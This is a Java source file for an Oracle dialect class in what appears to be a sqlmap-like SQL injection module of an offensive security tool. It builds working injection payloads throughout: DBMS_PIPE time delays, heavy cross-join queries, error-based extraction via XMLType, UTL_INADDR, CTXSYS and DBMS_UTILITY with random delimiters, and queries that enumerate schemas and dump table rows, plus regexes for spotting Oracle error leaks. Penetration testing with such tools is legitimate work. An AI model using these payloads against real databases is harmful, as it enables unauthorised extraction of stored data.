package com.omnistrike.modules.exploit.omnimap.dbms;

import java.util.List;
import java.util.concurrent.ThreadLocalRandom;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

/**
 * Oracle Database dialect for OmniMap.
 * Uses ALL_TABLES/ALL_TAB_COLUMNS, SUBSTR(), CHR(), DBMS_PIPE.RECEIVE_MESSAGE for delays,
 * CASE WHEN for conditionals, and XMLType/UTL_INADDR/CTXSYS for error-based extraction.
 */
public class OracleDialect implements DbmsDialect {

    /** Random markers for error-based extraction (like sqlmap's kb.chars.start/stop) */
    private final String errorPrefixDecoded;
    private final String errorSuffixDecoded;
    private final int errorRandNum;

    public OracleDialect() {
        this.errorPrefixDecoded = randomMarker(4);
        this.errorSuffixDecoded = randomMarker(5);
        this.errorRandNum = ThreadLocalRandom.current().nextInt(1000, 10000);
    }

    @Override
    public String getErrorPrefixDecoded() { return errorPrefixDecoded; }

    @Override
    public String getErrorSuffixDecoded() { return errorSuffixDecoded; }

    private static String randomMarker(int length) {
        ThreadLocalRandom rng = ThreadLocalRandom.current();
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < length; i++) {
            sb.append((char) rng.nextInt(0x71, 0x79));
        }
        return sb.toString();
    }

    /**
     * Convert a marker string to CHR(n)||CHR(n)||... format.
     * Markers built from CHR() calls only appear in error output, not reflected SQL.
     */
    private static String toChrConcat(String s) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < s.length(); i++) {
            if (i > 0) sb.append("||");
            sb.append("CHR(").append((int) s.charAt(i)).append(")");
        }
        return sb.toString();
    }

    @Override
    public String getName() { return "Oracle"; }

    @Override
    public String currentDatabase() {
        // Must return the current SCHEMA/USER, not the database name.
        // ALL_TABLES.owner and ALL_TAB_COLUMNS.owner filter by user/schema,
        // so currentDatabase() must match that — otherwise listTables() returns nothing.
        return "SELECT USER FROM DUAL";
    }

    @Override
    public String errorTestQuery() {
        // Guaranteed non-null for error-based detection
        return "SELECT NVL(CAST(USER AS VARCHAR2(100)),'1') FROM DUAL";
    }

    @Override
    public String listDatabases() {
        // Oracle doesn't have multiple databases like MySQL; list tablespace owners instead
        return "SELECT DISTINCT owner FROM ALL_TABLES";
    }

    @Override
    public String listTables(String database) {
        return "SELECT table_name FROM ALL_TABLES WHERE owner='" + database.toUpperCase() + "'";
    }

    @Override
    public String listColumns(String database, String table) {
        return "SELECT column_name FROM ALL_TAB_COLUMNS WHERE owner='" + database.toUpperCase()
                + "' AND table_name='" + table.toUpperCase() + "'";
    }

    @Override
    public String dumpData(String database, String table, List<String> columns, int offset, int limit) {
        String cols = columns.stream()
                .map(c -> "NVL(CAST(\"" + c + "\" AS VARCHAR2(4000)),CHR(32))")
                .collect(Collectors.joining("||CHR(124)||"));
        return "SELECT " + cols + " FROM (SELECT a.*,ROWNUM rnum FROM "
                + "\"" + database.toUpperCase() + "\".\"" + table.toUpperCase() + "\" a WHERE ROWNUM<="
                + (offset + limit) + ") WHERE rnum>" + offset;
    }

    @Override
    public String charFunction(int ascii) {
        return "CHR(" + ascii + ")";
    }

    @Override
    public String substringFunction(String expr, int pos, int len) {
        return "SUBSTR((" + expr + ")," + pos + "," + len + ")";
    }

    @Override
    public String lengthFunction(String expr) {
        return "LENGTH((" + expr + "))";
    }

    @Override
    public String sleepFunction(int seconds) {
        return "DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(66)||CHR(67)," + seconds + ")";
    }

    @Override
    public String ifFunction(String condition, String trueVal, String falseVal) {
        return "CASE WHEN (" + condition + ") THEN " + trueVal + " ELSE " + falseVal + " END";
    }

    @Override
    public String commentSuffix() {
        return "--";
    }

    @Override
    public String concatenate(String... parts) {
        return String.join("||", parts);
    }

    /**
     * Replacement tokens for Oracle XMLType REPLACE() escapes.
     * Like sqlmap: XMLType interprets content as XML, so certain characters break parsing.
     * sqlmap wraps the query in REPLACE() calls to substitute these characters with safe tokens,
     * then reverses after extraction.
     */
    public static final String XML_SPACE_TOKEN = "qspaq";
    public static final String XML_DOLLAR_TOKEN = "qdolq";
    public static final String XML_AT_TOKEN = "qattq";
    public static final String XML_HASH_TOKEN = "qhshq";

    @Override
    public List<String> errorFunctions() {
        // Ordered by sqlmap level: XMLType(L1), UTL_INADDR(L2), CTXSYS(L3), DBMS_UTILITY(L4)
        // All use CHR() delimiter markers so they only appear in error output, not reflected SQL.
        // CRITICAL: Oracle requires a comparison operator (e.g., AND randNum=expr),
        // not bare AND expr. Each template includes errorRandNum= prefix.
        String pChr = toChrConcat(errorPrefixDecoded);
        String sChr = toChrConcat(errorSuffixDecoded);

        // XMLType REPLACE escapes — like sqlmap: wrap query in REPLACE() for space, $, @, #
        // These characters break XML parsing inside XMLType(). sqlmap uses random 5-char tokens;
        // we use fixed tokens and reverse them after extraction in ErrorExtractor.
        // Format: REPLACE(REPLACE(REPLACE(REPLACE((%s),CHR(32),'qspaq'),CHR(36),'qdolq'),CHR(64),'qattq'),CHR(35),'qhshq')
        String xmlReplace = "REPLACE(REPLACE(REPLACE(REPLACE((%s),CHR(32),'" + XML_SPACE_TOKEN +
                "'),CHR(36),'" + XML_DOLLAR_TOKEN + "'),CHR(64),'" + XML_AT_TOKEN +
                "'),CHR(35),'" + XML_HASH_TOKEN + "')";

        return List.of(
                // Level 1 (#27): XMLType with CHR() delimiters + REPLACE escapes — like sqlmap
                errorRandNum + "=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||" + pChr + "||" + xmlReplace + "||" + sChr + "||CHR(62))) FROM DUAL)",
                // Level 2 (#29): UTL_INADDR.GET_HOST_ADDRESS with delimiters
                errorRandNum + "=UTL_INADDR.GET_HOST_ADDRESS(" + pChr + "||(%s)||" + sChr + ")",
                // Level 3 (#31): CTXSYS.DRITHSX.SN with delimiters
                errorRandNum + "=CTXSYS.DRITHSX.SN(" + errorRandNum + "," + pChr + "||(%s)||" + sChr + ")",
                // Level 4 (#33): DBMS_UTILITY.SQLID_TO_SQLHASH with delimiters
                errorRandNum + "=DBMS_UTILITY.SQLID_TO_SQLHASH(" + pChr + "||(%s)||" + sChr + ")"
        );
    }

    @Override
    public List<String> errorFunctionsForLevel(int level) {
        List<String> all = errorFunctions();
        // sqlmap gating: L1=XMLType, L2=+UTL_INADDR, L3=+CTXSYS, L4=+DBMS_UTILITY
        if (level >= 4) return all;
        if (level >= 3) return all.subList(0, 3);
        if (level >= 2) return all.subList(0, 2);
        return all.subList(0, 1); // Level 1: XMLType only
    }

    @Override
    public String heavyQuery(int seconds) {
        // sqlmap always uses 5 cross-joined ALL_USERS tables for Oracle heavy queries
        return "(SELECT COUNT(*) FROM ALL_USERS t1,ALL_USERS t2,ALL_USERS t3,ALL_USERS t4,ALL_USERS t5)";
    }

    /** Pre-compiled error patterns — sqlmap errors.xml + ORM/framework patterns */
    private static final List<Pattern> ERROR_PATTERNS = List.of(
            // === sqlmap core patterns (errors.xml) ===
            Pattern.compile("\\bORA-\\d{4,5}", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Oracle error", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Oracle.*?Driver", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Warning.*?\\W(oci|ora)_", Pattern.CASE_INSENSITIVE),
            Pattern.compile("quoted string not properly terminated", Pattern.CASE_INSENSITIVE),
            Pattern.compile("SQL command not properly ended", Pattern.CASE_INSENSITIVE),
            Pattern.compile("macromedia\\.jdbc\\.oracle", Pattern.CASE_INSENSITIVE),
            Pattern.compile("oracle\\.jdbc", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Zend_Db_(Adapter|Statement)_Oracle_Exception", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Pdo[./_\\\\](Oracle|OCI)", Pattern.CASE_INSENSITIVE),
            Pattern.compile("OracleException", Pattern.CASE_INSENSITIVE),
            // === Native Oracle errors ===
            Pattern.compile("PLS-\\d{4,5}", Pattern.CASE_INSENSITIVE),
            Pattern.compile("SP2-\\d{4,5}", Pattern.CASE_INSENSITIVE),
            Pattern.compile("TNS-\\d{4,5}", Pattern.CASE_INSENSITIVE),
            Pattern.compile("oracle\\.jdbc\\.driver", Pattern.CASE_INSENSITIVE),
            Pattern.compile("oracle\\.jdbc\\.OraclePreparedStatement", Pattern.CASE_INSENSITIVE),
            Pattern.compile("java\\.sql\\.SQLException.*?Oracle", Pattern.CASE_INSENSITIVE),
            Pattern.compile("missing right parenthesis", Pattern.CASE_INSENSITIVE),
            Pattern.compile("invalid identifier", Pattern.CASE_INSENSITIVE),
            Pattern.compile("table or view does not exist", Pattern.CASE_INSENSITIVE),
            Pattern.compile("not enough values", Pattern.CASE_INSENSITIVE),
            Pattern.compile("too many values", Pattern.CASE_INSENSITIVE),
            Pattern.compile("unique constraint.*?violated", Pattern.CASE_INSENSITIVE),
            Pattern.compile("cannot insert NULL", Pattern.CASE_INSENSITIVE),
            Pattern.compile("invalid number", Pattern.CASE_INSENSITIVE),
            Pattern.compile("not a valid month", Pattern.CASE_INSENSITIVE),
            Pattern.compile("divisor is equal to zero", Pattern.CASE_INSENSITIVE),
            Pattern.compile("single-row subquery returns more than one row", Pattern.CASE_INSENSITIVE),
            Pattern.compile("missing expression", Pattern.CASE_INSENSITIVE),
            Pattern.compile("not a GROUP BY expression", Pattern.CASE_INSENSITIVE),
            Pattern.compile("command not properly ended", Pattern.CASE_INSENSITIVE),
            Pattern.compile("maximum number of expressions in a list is 1000", Pattern.CASE_INSENSITIVE),
            Pattern.compile("listener does not currently know of service", Pattern.CASE_INSENSITIVE),
            Pattern.compile("OCIStmt(Execute|Prepare)", Pattern.CASE_INSENSITIVE),
            Pattern.compile("OCI runtime error", Pattern.CASE_INSENSITIVE),
            // === ORM / framework patterns ===
            Pattern.compile("cx_Oracle\\.(DatabaseError|OperationalError)", Pattern.CASE_INSENSITIVE),
            Pattern.compile("oracledb\\..*?Error", Pattern.CASE_INSENSITIVE),
            Pattern.compile("ActiveRecord::StatementInvalid.*?ORA-", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Sequel::DatabaseError.*?ORA-", Pattern.CASE_INSENSITIVE),
            Pattern.compile("sqlalchemy\\.exc\\..*?ORA-", Pattern.CASE_INSENSITIVE),
            Pattern.compile("django\\.db\\.utils\\.DatabaseError.*?ORA-", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Doctrine\\\\DBAL\\\\Exception.*?oci", Pattern.CASE_INSENSITIVE),
            Pattern.compile("org\\.hibernate\\.exception\\.SQLGrammarException.*?oracle", Pattern.CASE_INSENSITIVE),
            Pattern.compile("org\\.jooq\\.exception\\.DataAccessException.*?oracle", Pattern.CASE_INSENSITIVE),
            Pattern.compile("DBD::Oracle", Pattern.CASE_INSENSITIVE),
            Pattern.compile("go-ora.*?error", Pattern.CASE_INSENSITIVE),
            Pattern.compile("godror\\..*?Error", Pattern.CASE_INSENSITIVE),
            Pattern.compile("Devart\\.Data\\.Oracle", Pattern.CASE_INSENSITIVE)
    );

    @Override
    public List<Pattern> errorPatterns() {
        return ERROR_PATTERNS;
    }

    @Override
    public String countRows(String database, String table) {
        return "SELECT COUNT(*) FROM \"" + database.toUpperCase() + "\".\"" + table.toUpperCase() + "\"";
    }

    @Override
    public String separator() {
        return "CHR(124)";
    }

    @Override
    public String unionFrom() {
        return " FROM DUAL";
    }

    @Override
    public String limitOffset(String query, int limit, int offset) {
        // Oracle 11g+ compatible pagination using ROWNUM + ORDER BY.
        // ORDER BY 1 makes ROWNUM deterministic (alphabetical order).
        // Preserves single-column result (no extra rnum) for scalar subquery
        // compatibility with LENGTH()/SUBSTR()/ASCII().
        if (offset == 0) {
            return "SELECT * FROM (" + query + " ORDER BY 1) WHERE ROWNUM <= " + limit;
        }
        // For offset > 0: ordered MINUS. Each side is deterministically sorted,
        // so (first N+offset rows) MINUS (first offset rows) = exactly the Nth row.
        // Wrapped in outer SELECT to ensure valid scalar subquery for LENGTH()/SUBSTR().
        return "SELECT * FROM ("
                + "SELECT * FROM (" + query + " ORDER BY 1) WHERE ROWNUM <= " + (offset + limit)
                + " MINUS "
                + "SELECT * FROM (" + query + " ORDER BY 1) WHERE ROWNUM <= " + offset
                + ")";
    }
}
